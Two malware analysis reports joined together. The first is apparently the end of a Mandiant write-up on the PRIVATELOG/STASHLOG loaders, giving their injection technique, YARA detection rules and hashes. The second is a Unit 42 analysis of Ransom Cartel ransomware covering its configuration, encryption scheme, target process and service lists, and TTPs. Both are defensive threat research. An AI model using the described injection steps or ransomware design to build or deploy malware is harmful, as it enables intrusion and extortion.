The malicious code is executed at the DLL’s entry point.
It starts by verifying the command-line arguments of the process it is running in and expects to be running under svchost.exe -k print.
If this matches, the malware resolves the function address for the ServiceMain export function of PrintConfig.dll, which is the service entry point of the service using this command line.
This function is patched using Microsoft Detours—a publicly available library used for instrumenting Win32 functions—so that the execution flow appears to happen in the legitimate service DLL. 
The patched ServiceMain function is where PRIVATELOG executes most of its functionality. 
Similarly to STASHLOG, PRIVATELOG starts by enumerating *.blf files in the default user’s profile directory and uses the .blf file with the oldest creation date timestamp. 
If a matching .blf file is found, PRIVATELOG opens it with the clfsw32.dll function CreateLogFile().
The log file is then marshalled and parsed using other functions specific to CLFS, such as CreateLogMarshallingArea(), ReadLogFile() and ReadNextLogFile().
The malware expects to find specific entries which match our analysis of the installer. 
PRIVATELOG expects the first log entry to have the following format: 
A size greater than 40 (payload header size)
A WORD value of 2, 3, 4, or 5 at offset 16 (number of blocks) 
If the first entry matches the aforementioned criteria, then subsequent records are read until one has an 8-byte header with the following: Its first DWORD must equal 2 (assumed magic value) 
Its second DWORD must be less than the entry’s size minus the header.
This value equals the size of the payload which will be decrypted. 
Once the expected log entry is found, its contents are decrypted using the HC-128 encryption algorithm.
The decryption key and IV are generated using the same unique host properties that were used by STASHLOG. 
It is worth noting that PRIVATELOG only decrypts the first matching block and that at least 2 to 5 blocks are expected to be inserted by STASHLOG. 
PRIVATELOG finally uses a rarely seen technique to execute the DLL payload, which this time relies on NTFS transactions.
The injection process is similar to Phantom DLL hollowing and is described as follows: Open a transacted handle to a copied file via the API CreateFileTransactedA() 
In the sample analyzed by Mandiant, the file used for the transaction is a copy of the legitimate binary C:\Windows\System32\dbghelp.dll, which is copied to C:\Windows\system32\WindowsPowerShell\v1.0\dbghelp.dll. 
Overwrite the transacted file with the decrypted payload contents Create a section backed by the transacted file with SEC_IMAGE attributes via the API NtCreateSection() Map a view of the newly created section This implicitly loads the transacted file data to some degree.
The PE header is validated, and sections mapped into memory; however, it does not fix section permissions or resolve imports. 
Fix the section permissions Resolve the imports in the Import Table Execute the payload's entry point Find and execute the export function named SvcMain Hunting for PRIVATELOG Container Sample Figure 4 shows a fabricated container file representing a sample expected log file created by STASHLOG and loaded by PRIVATELOG. 
Figure 4: Example log file created by STASHLOG YARA Rules Mandiant created YARA rules to hunt for PRIVATELOG and STASHLOG as well as possible variants based on various methodologies and unique strings that they use.
Rules to detect CLFS containers matching PRIVATELOG structures or containing encrypted data are also provided. 
These rules should be tested thoroughly before they are run in a production environment. 
import "math" import "pe" rule HUNTING_Win_PRIVATELOG_CLFS { meta: author = "adrien.bataille@mandiant.com" description = "This rule looks for CLFS containers containing possible data used by PRIVATELOG.
As this rule may loop on file content, preferably use on regtrans-ms files only or with caution." 
condition: filesize < 100MB and filesize >= 512KB and uint16(0) == 0x0015 // signature and uint8(2) !
= 0
// fixup value upper byte and uint8(3) == 0 // always 0 and uint16(4) == uint16(6) and uint16(4) !
//
num sectors and uint32(8) 
== 0 // always 0 and uint32(16) == 1 // always 1 and uint32(20) == 0 // always 0 and uint32(40)
== 0x70 // size of record header // size of data at least 0x28 for first record and uint32(0x70+0x18) - 0x28 >= 0x28 // payloadHeader.numblocks (payloadHeader at 0x70+uint16(0x70+0x22)) and (uint16(0x70+uint16(0x70+0x22)+0x10) == 0x2 or uint16(0x70+uint16(0x70+0x22)+0x10) == 0x3 or uint16(0x70+uint16(0x70+0x22)+0x10) == 0x4 or uint16(0x70+uint16(0x70+0x22)+0x10) == 0x5) // this is a size, assume it is less than our filesize and uint32(0x70+uint16(0x70+0x22)+0xC) < filesize // confirm malware using 2 different methods and ( // look for hardcoded magic in first log record uint32(0x70+uint16(0x70+0x22))
== 0x00686365 or // loop through each possible sector to look for a blockheader struct for any i in (0 .. (filesize \ 512) - 1): ( // look for record header, num sectors and size of record uint16(i*512)==0x0015 and uint16(i*512+4) == uint16(i*512+6) and uint16(i*512+4) !
and uint32(i*512+40) == 0x70 and uint32(i*512+0x88) >
0x28 and uint32(i*512+0x88) < filesize and // look for magic and blockheader.blocksize in payload uint32(i*512+0x70+uint16(i*512+0x70+0x22))
== 2 and uint32(i*512+0x70+uint16(i*512+0x70+0x22)+4) == uint32(i*512+0x88)-0x30 ) ) } rule HUNTING_Win_CLFS_Entropy { meta: author = "adrien.bataille@mandiant.com" description = "This rule looks for CLFS containers with records containing high entropy.
As this rule may loop on file content, preferably use on regtrans-ms files only or with caution." 
== 0x70 // size of record header and for any i in (0 .. (filesize \ 512) - 1) : ( // look for record header, num sectors and size of record uint16(i*512)==0x0015 and uint16(i*512+4)
== uint16(i*512+6) and uint16(i*512+4) !
and uint32(i*512+40) == 0x70 and uint32(i*512+0x88) > 0x200 and uint32(i*512+0x88) < filesize // look for high entropy in the record[8:] to account for possible block header and math.entropy(i*512+0x70+uint16(i*512+0x70+0x22)+8, i*512+0x70+uint16(i*512+0x70+0x22)+uint32(i*512+0x88)-0x28) > 7.95 ) } rule HUNTING_Win_PRIVATELOG_1_strict { meta: author = "adrien.bataille@mandiant.com" description = "Detects PRIVATELOG and STASHLOG variants based on strings and imports" md5 = "91b08896fbda9edb8b6f93a6bc811ec6" strings: $hvid = "Global\\HVID_" ascii $apci = "Global\\APCI#" wide condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C))
== 0x00004550 and ( all of them and ( pe.imports("clfsw32.dll","CreateLogMarshallingArea") and pe.imports("kernel32.dll", "VirtualProtect") and pe.imports("ktmw32.dll", "CreateTransaction") and pe.imports("kernel32.dll", "CreateFileTransactedA") ) ) } rule HUNTING_Win_PRIVATELOG_2_notstrict { meta: author = "adrien.bataille@mandiant.com" description = "Detects possible PRIVATELOG and STASHLOG variants based on strings or imports.
This rule is purposefully loose so there may be a higher FP rate." 
md5 = "91b08896fbda9edb8b6f93a6bc811ec6" strings: $hvid = "Global\\HVID_" ascii $apci = "Global\\APCI#" wide condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C))
== 0x00004550 and ( any of them or ( pe.imports("clfsw32.dll","CreateLogMarshallingArea") and pe.imports("kernel32.dll", "VirtualProtect") and pe.imports("ktmw32.dll", "CreateTransaction") and pe.imports("kernel32.dll", "CreateFileTransactedA") ) ) } rule HUNTING_Win_hijack_prntvpt { meta: author = "adrien.bataille@mandiant.com" description = "Detects possible hijack of legitimate prntvpt.dll based on missing export" md5 = "91b08896fbda9edb8b6f93a6bc811ec6" condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C))
== 0x00004550 and pe.exports("PTOpenProviderEx") and not pe.exports("MergeAndValidatePrintTicketThunk") } EDR / SIEM To complement static hunting with Yara, Mandiant also recommends hunting for similar indicators of compromise in “process”, “imageload” or “filewrite” events of typical EDR logs.
These would cover cases where PRIVATELOG may resolve imports dynamically with LoadLibrary() and GetProcAddress(), versus static imports in currently known samples. 
Figure 5 identifies key modules loaded by PRIVATELOG that may be used to create hunting queries: ktmw32.dll, dbghelp.dll and clfsw32.dll. Figure 5: Memory view of a running PRIVATELOG process 
Example hunting queries include: Any process writing or loading C:\Windows\System32\WindowsPowerShell\v1.0\dbghelp.dll Any process loading both clfsw32.dll and ktmw32.dll svchost.exe -k print loading clfsw32.dll or ktmw32.dll Any svchost.exe process loading clfsw32.dll Concerning svchost.exe, although we have observed many cases of other svchost.exe processes loading ktmw32.dll, we have only rarely observed svchost.exe processes loading clfsw32.dll. 
File writes to .regtrans-ms or .blf files are fairly common, however stacking the process name and file paths may also provide good results.
For example, file writes to the registry transaction file for the default user are likely to be uncommon. 
Hashes PRIVATELOG Prntvpt.dll: 1e53559e6be1f941df1a1508bba5bb9763aedba23f946294ce5d92646877b40c STASHLOG Shiver.exe: 720610b9067c8afe857819a098a44cab24e9da5cf6a086351d01b73714afd397 MITRE ATT&ACK Techniques ID Technique T1012 Query Registry T1564 Hide Artifacts T1574 Hijack Execution Flow T1574.002 DLL Side-Loading T1055.013 Process Injection: Process Doppelgänging FireEye Product Detections Platform(s) Detection Name Network Security Email Security Detection On Demand Malware Analysis File Protect FE_APT_Loader_Win_PRIVATELOG FE_APT_Installer_Win_STASHLOG HX Security Generic.mg.0c605276ff21b515 
title: Ransom Cartel Ransomware: A Possible Connection With REvil url: https://unit42.paloaltonetworks.com/ransom-cartel-ransomware/ This post is also available in: 日本語 (Japanese)Executive Summary Ransom Cartel is ransomware as a service (RaaS) that surfaced in mid-December 2021.
This ransomware performs double extortion attacks and exhibits several similarities and technical overlaps with REvil ransomware.
REvil ransomware disappeared just a couple of months before Ransom Cartel surfaced and just one month after 14 of its alleged members were arrested in Russia.
When Ransom Cartel first appeared, it was unclear whether it was a rebrand of REvil or an unrelated threat actor who reused or mimicked REvil ransomware code. 
In this report, we will provide our analysis of Ransom Cartel ransomware, as well as our assessment of the possible connections between REvil and Ransom Cartel ransomware. 
Palo Alto Networks customers receive help with the detection and prevention of Ransom Cartel ransomware through the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security services such as WildFire). 
If you think a cyber incident may have impacted you, the Unit 42 Incident Response team is available 24/7/365.
You can also take preventative steps by requesting any of our cyber risk management services. Indicators of compromise and Ransom Cartel-associated tactics, techniques and procedures (TTPs) can be found in the Ransom Cartel ATOM. 
We updated this blog on Oct. 15 based on further analysis, additional evidence and discussion around the complexities of redirects from REvil’s dark web leak site.
Updated sections include our History of the REvil Disappearance and the Ransom Cartel Overview. 
Table of Contents History of the REvil DisappearanceRansom Cartel OverviewTTPs Observed During Ransom Cartel AttacksRansom NotesRansom Cartel TOR SiteTechnical Details Ransom Cartel and REvil Code ComparisonRansom Cartel Tactics, Techniques and ProceduresMalware, Tools and Exploits UsedConclusionIndicators of Compromise History of the REvil Disappearance In October 2021, REvil operators went quiet.
REvil’s dark web leak site became unreachable.
Around mid-April 2022, individual security researchers and cybersecurity media outlets reported a new development with REvil that could signify the gang’s return.
REvil’s name-and-shame blogs at the dnpscnbaix6nkwvystl3yxglz7nteicqrou3t75tpcc5532cztc46qyd[.]onion and aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd[.]onion domains started redirecting users to a new name-and-shame blog available at blogxxu75w63ujqarv476otld7cyjkq4yoswzt4ijadkjwvg3vrvd5yd[.]onion/Blog. 
This redirect was documented in our post, “Understanding REvil,” in Bleeping Computer’s post on REvil’s TOR sites redirecting to a new ransomware operation and in a Twitter post from vx-underground. 
Later the same day, the redirect was removed (as noted by vx-underground).
At the time, it was not possible to make a definitive attribution stating which group was behind the redirect because the new name-and-shame blog did not claim any name or affiliation. 
At the start of the redirect, no breached organizations were listed on the site.
Over time, the threat actors began adding records that had appeared on “Happy Blog,” mostly from late April to October 2021.
They also included the old file-sharing links previously used by REvil as proof of compromise. 
The newly established blog listed Tox Chat ID for communication with the ransomware operator.
The blog hinted at its operators’ connection to REvil with the claim that the newer group offered “the same, yet improved software.” 
Unit 42 initially believed that this blog was linked to Ransom Cartel and that the “improved software” the threat actors referred to was a new Ransom Cartel variant.
However, after further analysis and seeing more evidence, we believe it is also possible that the name-and-shame blog and Ransom Cartel are two separate operations. 
Whether this blog is operated by Ransom Cartel or a different group, what is clear is that, while REvil may have disappeared, its malicious influence has not.
The operator of the newly established blog appears to have some type of access to REvil or ties to the group.
At the same time, our analysis of Ransom Cartel samples (detailed in the sections below) provides strong evidence of ties to REvil as well. 
To read more about REvil, its disappearance and the redirect, please refer to our blog, Understanding REvil. 
Ransom Cartel Overview We first observed Ransom Cartel around mid-January 2022.
Security researchers at MalwareHunterTeam believe the group to have been active since at least December 2021.
They observed the first known Ransom Cartel activity and noticed several similarities and technical overlaps with REvil ransomware. 
There are a number of theories about the origins of Ransom Cartel.
One theory in the community suggests that Ransom Cartel could be the result of multiple groups merging.
However, researchers at MalwareHunterTeam have put forward that one of the groups believed to have merged has denied any connection with Ransom Cartel.
Additionally, Unit 42 has seen no connection between these groups and Ransom Cartel other than that many of them have connections to REvil. 
At this time, we believe that Ransom Cartel operators had access to earlier versions of REvil ransomware source code, but not some of the most recent developments (see our Ransom Cartel and REvil Code Comparison for more details). 
This suggests there was a relationship between the groups at some point, though it may not have been recent. 
Unit 42 has also observed Ransom Cartel group breaching organizations, with the first known victims observed by us around January 2022 in the U.S. and France.
Ransom Cartel has attacked organizations in the following industries: education, manufacturing, and utilities and energy.
Unit 42 incident responders have also assisted clients with response efforts in several Ransom Cartel cases. 
Like many other ransomware gangs, Ransom Cartel leverages double extortion techniques.
Unit 42 has observed the group taking an aggressive approach, threatening not only to publish stolen data to their leak site, but also to send it to the victim’s partners, competitors and the news in an effort to inflict reputational damage. 
Ransom Cartel typically gains initial access to an environment via compromised credentials, which is one of the most common vectors for initial access for ransomware operators.
This includes access credentials for external remote services, remote desktop protocol (RDP), secure shell protocol (SSH) and virtual private networks (VPNs).
These credentials are widely available in the cyber underground and offer threat actors a reliable means to gain access to victims' corporate networks. 
These credentials can also be obtained through the work of ransomware operators themselves or by purchasing them from an initial access broker. 
Initial access brokers are actors who offer to sell compromised network access.
Their motivation is not to carry out cyberattacks themselves but rather to sell the access to other threat actors.
Due to the profitability of ransomware, these brokers likely have working relationships with RaaS groups based on the amount they are willing to pay. 
Unit 42 has seen evidence that Ransom Cartel has relied on this type of service to gain initial access for ransomware deployment. 
Unit 42 has also observed Ransom Cartel encrypting both Windows and Linux VMWare ESXi servers in attacks on corporate networks. 
Tactics, Techniques and Procedures Observed During Ransom Cartel Attacks Unit 42 observed a Ransom Cartel threat actor using a tool called DonPAPI, which has not been observed in past incidents.
This tool can locate and retrieve Windows Data Protection API (DPAPI) protected credentials, which is known as DPAPI dumping. 
DonPAPI is used to search machines for certain files known to be DPAPI blobs, including Wi-Fi keys, RDP passwords,
credentials saved in web browsers, etc.
To avoid the risk of detection by antivirus (AVs) or endpoint detection and response (EDR), the tool downloads the files and decrypts them locally.
To compromise Linux ESXi devices, Ransom Cartel uses DonPAPI to harvest credentials stored in web browsers used to authenticate to the vCenter web interface. 
We also observed the threat actor using additional tools, including LaZagne to recover credentials stored locally and Mimikatz to steal credentials from host memory. 
In order to establish persistent access to Linux ESXi devices, the threat actor enables SSH after authenticating to vCenter.
The threat actor will create new accounts and sets the account’s user identifier (UID) to zero.
For Unix/Linux users, a UID=0 is root.
This means any security checks are bypassed. 
The threat actor was observed downloading and using a cracked version of a legitimate tool called PDQ Inventory, which is a legitimate system management solution that IT administrators use to scan their network and collect hardware, software and Windows configuration data.
Ransom Cartel used this as a remote access tool to establish an interactive command and control channel and to scan the compromised network. 
Once a VMware ESXi server is compromised, the threat actor launches the encryptor, which will automatically enumerate the running virtual machines (VMs) and shut them down using the esxcli command.
Terminating the VM processes ensures that the ransomware can successfully encrypt VMware-related files. 
During encryption, Ransom Cartel specifically seeks out files with the following file extensions: .log, .vmdk, .vmem, .vswp and .vmsn.
These extensions are associated with ESXi snapshots, log files, swap files, paging files and virtual disks.
Post-encryption, the following file extensions have been observed: .zmi5z, .nwixz, .ext, .zje2m, .5vm8t and .m4tzt. 
Ransom Notes Unit 42 has observed two different versions of ransom notes sent by Ransom Cartel.
The first note was first observed around January 2022, and the other one first appeared in August 2022.
The second version appeared to be completely rewritten, as shown in Figure 1. Figure 1.
Ransom Cartel ransom notes.
The note on the left was first observed in January 2022; the note on the right was first observed in August 2022.It's interesting to note that the structure of the first ransom note used by Ransom Cartel shares similarities with a ransom note sent by REvil, as shown in Figure 2.
In addition to the use of similar wording, both notes employed the same format of a 16-byte hexadecimal string for the UID. Figure 2.
Ransom Cartel ransom note shown on the left, compared to a ransom note sent by REvil shown on the right.
Ransom Cartel TOR Site Ransom Cartel’s website for communication with victims was available via a TOR link provided in the ransom note.
We’ve observed multiple TOR URLs belonging to Ransom Cartel, which likely indicates that they had been changing infrastructure and actively developing their website.
A TOR private key is needed to access the website. 
When the key is entered, the following page is loaded: Figure 3.
Ransom Cartel TOR site landing page.
Upon entering the TOR site through the Authorization button, a screen requesting input of the details included in the ransom note is requested. 
Figure 4.
Ransom Cartel website, requesting the ID and key provided in the ransom note.
Once authorization is completed on the TOR site, the page shown in Figure 5 appears.
The site includes details such as ransom demand, in both US dollars and bitcoin, and the Bitcoin wallet address. Figure 5.
Ransom Cartel TOR site.
Technical Details Two Ransom Cartel samples were used during this analysis: File one SHA256: 55e4d509de5b0f1ea888ff87eb0d190c328a559d7cc5653c46947e57c0f01ec5File two SHA256: 2411a74b343bbe51b2243985d5edaaabe2ba70e0c923305353037d1f442a91f5 Both of the samples contained three total exports: 
RathbuigeServiceMainSvchostPushServiceGlobals The samples also contain a DllEntryPoint, should the DLL be executed without specifying an export.
The DllEntryPoint leads to a function that iterates over a call to the Curve25519 Donna algorithm 24 times.
Once the iteration ends, the sample will query the system metrics, specifically for the SM_CLEANBOOT value.
If this value is anything other than 0, the ransomware will proceed to spawn another instance of itself via rundll32.exe, specifying the Rathbuige export. 
SM_CLEANBOOT Values Description 0 Normal Boot 1 Fail-Safe Boot 2 Fail-Safe with Network Boot Table 1.
SM_CLEANBOOT values. 
The Rathbuige export starts by creating the following mutex: Global\\266ee996-e1ac-4eaa-9bdb-0b639d41b32d Once the mutex is created, the sample begins to decrypt and parse its embedded configuration.
The configuration is stored as a base64-encoded blob, whereby the first 16 bytes of the base64-encoded blob is the RC4 key used for decrypting the rest of the blob once it has been decoded. 
Figure 6.
Ransom Cartel encrypted configuration.
Once decrypted, the configuration is stored in JSON format and consists of information such as encrypted file extension, the threat actors' public Curve25519-donna key, a base64-encoded ransom note, and a list of processes and services to terminate prior to encryption. 
Figure 7.
Example of decrypted Ransom Cartel configuration.
A breakdown of the keys and their values within the configuration can be seen in Table 2. Configuration Key Value pk Attacker public key dbg Debug mode wht Allow listed items Files to avoid Extensions to avoid prc Processes to terminate svc Services to terminate nname Name of ransom note file nbody Ransom note content ext Encrypted file extension Table 2.
Configuration structure. 
dbsnmp raw_agent_svc onenote steam VeeamNFSSvc synctime infopath msaccess tbirdconfig mspub ocomm excel EnterpriseClient ocssd agntsvc winword ocautoupds thebat sql bedbh dbeng50 powerpnt wordpad xfssvccon VeeamTransportSvc CagService bengien visio outlook DellSystemDetect encsvc benetns pvlsvr isqlplussvc VeeamDeploymentSvc vsnapvss sqbcoreservice firefox mydesktopservice oracle mydesktopqos beserver thunderbird vxmon Table 3.
Targeted process list. 
BackupExecVSSProvider BackupExecManagementService AcronisAgent veeam VeeamDeploymentService ARSM BackupExecAgentAccelerator MSExchange$ PDVFSService MSSQL$ VeeamTransportSvc memtas MSExchange vss stc_raw_agent BackupExecDiveciMediaService CAARCUpdateSvc mepocs svc$ WSBExchange sophos VSNAPVSS MVarmor64 MSSQL sql BackupExecRPCService backup MVArmor BackupExecAgentBrowser VeeamNFSSvc BackupExecJobEngine CASAD2DWebSvc bedbg AcrSch2Svc Table 4.
Targeted service list. 
mod cpl ps1 cab com ani diagcab adv themepack shs sys rom cur ldf msu mpa spl msi msc wpx 386 diagcfg lock prf deskthemepack bin ico diagpkg nomedia idx ics hlp msp msstyles key cmd scr exe drv hta nls dll lnk icns ocx theme bat icl rtp Table 5.
Avoided extensions. 
Following decryption of the configuration, certain system information is gathered, including the username, computer name, domain name, locale and product name.
This information is then formatted into the following JSON structure: {"ver":%d,"pk":"%s","uid":"%s","sk":"%s","unm":"%s","net":"%s","grp":"%s","lng":"%s","bro":%s,"os":"%s","bit":%d,"dsk":"%s","ext":"%s"} Table 6 describes the purpose of each key within the structure. 
Key Value ver Version of the ransomware, hardcoded.
In both samples set to 0x65 (101) pk Public key found within the configuration uid Unique identifier calculated via CRC-32 hashing certain machine information sk Encoded session secret unm Username net Computer name grp Computer domain lng Computer locale bro Does keyboard locale match any hardcoded locale value – true/false os Product name bit System architecture dsk Disk information ext Ransomware extension Table 6.
Hardcoded JSON format keys and values. 
Once the gathered data has been formatted into the JSON structure, it is then encrypted using the same procedure that Ransom Cartel follows to generate session_secret blobs, which will be discussed shortly; put simply, it involves AES encryption, utilizing the SHA3 hash of a Curve25519 shared key for the AES key. 
Once encrypted, it is written to the registry key SOFTWARE\\Google_Authenticator\\b52dKMhj, with the sample first attempting to write to the HKEY_LOCAL_MACHINE hive, before writing to HKEY_CURRENT_USER if the right permissions are not possessed.
Once the data has been written to the registry, it is then base64-encoded and embedded within the ransom note, replacing the {KEY} placeholder. 
Once the configuration has been parsed and stored within the registry, the command line provided to the ransomware is parsed.
There are a total of five possible arguments, as shown in Table 7. Argument Description -nolan Instruct the sample not to attempt any form of network drive encryption -nolocal Prevent the encryption of all local volumes -path Target specific file path to encrypt -silent Appears to instruct the ransomware to avoid terminating running processes and services, and it begins encrypting files immediately -smode Causes the ransomware to use BCEdit in order to enable Safe Boot; check out this article on REvil’s use of “Windows Safe Mode” encryption for a discussion about this particular technique. 
Table 7.
Ransom Cartel accepted arguments. 
With that, let’s move on to analyzing the session secret generation procedure. 
Ransom Cartel first checks to see if the registry already contains previously generated values; if so, it will read those values into memory.
Otherwise, it will generate a total of two session secrets at runtime, with each secret containing 88 bytes of data. 
First, a public and private key pair will be generated using the code from this Curve25519 repository (session_public_1 and session_private_1).
When generating the first session secret, another session key pair is generated, (session_public_2 and session_private_2) and session_private_2 is paired with attacker_cfg_public (the public key embedded within the configuration) to generate a shared key.
This shared key is then hashed with the SHA3 hashing algorithm.
The resulting hash is used as an AES key with a random 16-byte initialization vector (IV) for encrypting a data blob consisting of four null bytes followed by session_private_1. Figure 8.
Diagram of session secret generation procedure.
From there, the encrypted blob is hashed using CRC-32, and then appended with the values session_public_2, the AES IV, and the calculated CRC-32 hash.
The resulting value is session_secret_1.
The second generated session secret follows the exact same procedure; however, instead of using attacker_cfg_public, it utilizes an embedded public key (attacker_embedded_public_1) within the binary to generate the shared key. Figure 9.
Decompiled session secret generation procedure.
One final embedded public key (attacker_embedded_public_2) is used to encrypt the data formatted into the JSON structure described above. 
This method of generating session secrets was documented by researchers at Amossys back in 2020; however, their analysis focused on an updated version of Sodinokibi/REvil ransomware, indicating a direct overlap between the REvil source code and the latest Ransom Cartel samples. 
Once the session secrets have been generated, they are written to the registry, alongside session_public_1 and attacker_cfg_public. 
Path Name Value SOFTWARE\\Google_Authenticator\\ WRZfsL attacker_cfg_public SOFTWARE\\Google_Authenticator\\ RB4y session_public_1 SOFTWARE\\Google_Authenticator\\ Kbcn0 session_secret_1 SOFTWARE\\Google_Authenticator\\ BSjHn session_secret_2 Table 8.
Registry paths and values used by Ransom Cartel. 
At this point, all the required information is gathered and generated so that file encryption can begin. 
For each file, a unique file public and private key pair are generated (file_public_1 and file_private_1), once again using Curve25519 Donna.
file_private_1 and session_public_1 are paired together to generate a shared key, which is hashed using SHA3.
The generated hash is used as the encryption key for Salsa20 (a symmetric encryption algorithm), and a random eight-byte nonce is generated using CryptGenRandom.
The CRC-32 hash of file_public_1 is calculated, and then four null bytes are encrypted using the generated Salsa20 matrix. 
Certain elements of the above data are then retained and used as part of the encrypted file footer; each file footer is 232 bytes in length and is made up of the following: 
session_secret_1 (88 bytes) 
session_secret_2 (88 bytes) file_public_1
(32 bytes) salsa_nonce (eight bytes) 
crc_file_public_1 (four bytes) encryption_type (four bytes) block_spacing (four bytes) encrypted_null (four bytes) 
Similarly to the session_secret generation, this structure is identical to that of the REvil samples analyzed by Amossys, further showing that there have been very few changes to the REvil source code when developing Ransom Cartel samples. 
Figure 10.
File encryption setup process.
Ransom Cartel and REvil Code Comparison The Ransom Cartel samples analyzed revealed similarities with REvil ransomware. 
The first notable similarity between Ransom Cartel and REvil is the structure of the configuration.
Examining a sample of REvil from 2019 (SHA256: 6a2bd52a5d68a7250d1de481dcce91a32f54824c1c540f0a040d05f757220cd3), the resemblance can be seen.
However, the storage of the encrypted configuration is slightly different, opting to store the configuration in a separate section within the binary (.ycpc19), with an initial 32-byte RC4 key followed by the raw encrypted configuration, whereas with the Ransom Cartel samples, the configuration is stored within the .data section as a base64-encoded blob. 
Figure 11.
REvil configuration storage.
Once the REvil configuration has decrypted, it utilizes the same JSON format, but contains additional values such as pid, sub, fast, wipe and dmn.
These values indicate additional functionality within the REvil sample, which could mean that either the Ransom Cartel developers removed certain functionality or they are building off of a much earlier version of REvil. 
Figure 12.
Decrypted REvil configuration.
As discussed previously, another major overlap is the code reuse across the two samples of Ransom Cartel.
Both use an identical encryption scheme, generating multiple public/private key pairs, and creating session secrets using the same procedure found within REvil samples. Figure 13.
REvil session secret generation function.
Both use Salsa20 and Curve25519 for file encryption, and there are very few differences in the layout of the encryption routine besides the structure of the internal type structs. 
Figure 14.
REvil file encryption setup function.
A particularly interesting difference between the two malware families is that REvil opts to obfuscate their ransomware much more heavily than the Ransom Cartel group, utilizing string encryption, API hashing and more, while Ransom Cartel has almost no obfuscation outside of the configuration, hinting that the group may not possess the obfuscation engine used by REvil. 
It is possible that the Ransom Cartel group is an offshoot of the original REvil threat actor group, where the individuals only possess the original source code of the REvil ransomware encryptor/decryptor, but do not have access to the obfuscation engine. 
Ransom Cartel Tactics, Techniques and Procedures Below is a list of TTPs observed being used by Ransom Cartel affiliates: TTPs Notes TA0001
Initial Access T1078.
Valid Accounts Uses legitimate VPN, RDP, Citrix or VNC credentials to maintain access to an environment. T1133.
External Remote Services Uses legitimate VPN or Citrix credentials to maintain access to an environment. 
TA0002 Execution T1072.
Software Deployment Tools Deploys PDQ Inventory Scanner tool. T1059.001.
Command and Scripting Interpreter:
PowerShell Uses PowerShell to retrieve the malicious payload and download additional resources such as Mimikatz and Rclone. T1059.003 Command and Scripting Interpreter:
Windows Command Shell Uses cmd.exe to execute commands. 
TA0003 Persistence T1003.008.
OS Credential Dumping: /etc/passwd and /etc/shadow Attempts to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking. T1136.001.
Create Account: Local Account Creates new users’ accounts. 
T1098.
Account Manipulation Adds newly created accounts to the administrators group to maintain elevated access. T1547.001.
Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder Adds registry run keys to achieve persistence.
In some cases, we observed using the following command: start cmd.exe /k runonce.exe /AlternateShellStartup T1197.
BITS Jobs Uses BITSAdmin to download and install payloads. 
TA0004 Privilege Escalation T1068.
Exploitation for Privilege Escalation Exploits Print Nightmare vulnerability. 
TA0005 Defense Evasion T1222.002.
File and Directory Permissions Modification:
Linux and Mac File and Directory Permissions Modification Uses the chmod +x command to grant executable permissions to the ransomware. T1112.
Modify Registry Modifies the Registry to disable UAC remote restrictions by setting SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to 1. T1070.001 Indicator Removal on Host: Clear Windows Event Logs Uses wevtutil to clear the Windows event logs. 
T1218.011.
System Binary Proxy Execution: Rundll32 Uses Rundll32 to load and execute malicious DLL. T1562.004.
Impair Defenses: Disable or Modify System Firewall Deletes rules in the Windows Defender Firewall exception list related to AnyDesk T1070.004.
Indicator Removal on Host: File Deletion Deletes some of its files used during operations as part of cleanup, including removing applications such as 7z.exe, tor.exe, ssh.exe T1070.003.
Indicator Removal on Host: Clear Command History Clears Windows PowerShell and WitnessClientAdmin log file. 
T1027.
Obfuscated Files or Information Uses encoded PowerShell commands. 
TA0006 Credential Access T1003.001.
OS Credential Dumping: LSASS Memory Uses Mimikatz to harvest credentials. 
T1555.003.
Credentials from Password Stores: Credentials from Web Browsers Compromises users’ saved passwords from browsers. 
TA0007 Discovery T1046.
Network Service Discovery Uses tools such as PDQ Inventory scanner, Advanced Port Scanner and netscan (which also scanned for the ProxyShell vulnerability). 
T1083.
File and Directory Discovery Searches for specific files prior to encryption. 
T1135.
Network Share Discovery Enumerates remote open SMB network shares T1087.001.
Account Discovery: Local Account Accesses ntuser.dat and /etc/passwd to enumerate all accounts. 
TA0008 Lateral Movement T1021.004.
Remote Services: SSH Uses Putty for remote access. T1550.002.
Use Alternate Authentication Material:
Pass the Hash Dumps password hashes for use in pass the hash authentication attacks. T1021.001.
Remote Services:
Remote Desktop Protocol Uses RDP for lateral movement. 
TA0009 Collection T1560.001.
Archive Collected Data: Archive via Utility Uses 7-Zip to compress stolen data for exfiltration. 
TA0010 Exfiltration T1567.002.
Exfiltration Over Web Service: Exfiltration to Cloud Storage Uses Rclone to exfiltrate data to cloud sharing websites (such as PCloud and MegaSync). 
TA0011 Command and Control T1219.
Remote Access Software Uses AnyDesk to remotely connect and transfer files. T1090.003.
Proxy: Multi-hop
Proxy Routes traffic over TOR and VPN servers to obfuscate their activities. 
T1105.
Ingress Tool Transfer Downloads and uploads files to and from the victim’s machine. 
TA0040 Impact T1486.
Data Encrypted for Impact Encrypts system data and adds the random extension to encrypted files.
The following extensions have been observed (.zmi5z, .nwixz, .ext, .zje2m, .5vm8t, .m4tzt). 
Table 9.
Tactics, techniques and procedures for Ransom Cartel activity. 
Malware, Tools and Exploits Used Execution Credential Access Discovery Privilege Escalation Lateral Movement Command and Control Exfiltration PowerShell Windows command shell MimikatzLaZagneDonPAPI PDQ Inventory scannerAdvanced Port Scannernetscan.exe Print Nightmare Putty AnyDeskCobalt Strike Rclone Table 10.
Malware, tools and exploits used. 
Conclusion Ransom Cartel is one of many ransomware families that surfaced during 2021.
While Ransom Cartel uses double extortion and some of the same TTPs we often observe during ransomware attacks, this type of ransomware uses less common tools – DonPAPI for example – that we haven’t observed in any other ransomware attacks. 
Based on the fact that the Ransom Cartel operators clearly have access to the original REvil ransomware source code, yet likely do not possess the obfuscation engine used to encrypt strings and hide API calls, we speculate that the operators of Ransom Cartel had a relationship with the REvil group at one point, before starting their own operation. 
Due to the high-profile nature of some organizations targeted by Ransom Cartel and steady stream of Ransom Cartel cases identified by Unit 42, the operator and/or affiliates behind the ransomware likely will continue to attack and extort organizations. 
Palo Alto Networks customers receive help with detection and prevention of Ransom Cartel ransomware in the following ways: WildFire:
All known samples are identified as malware. 
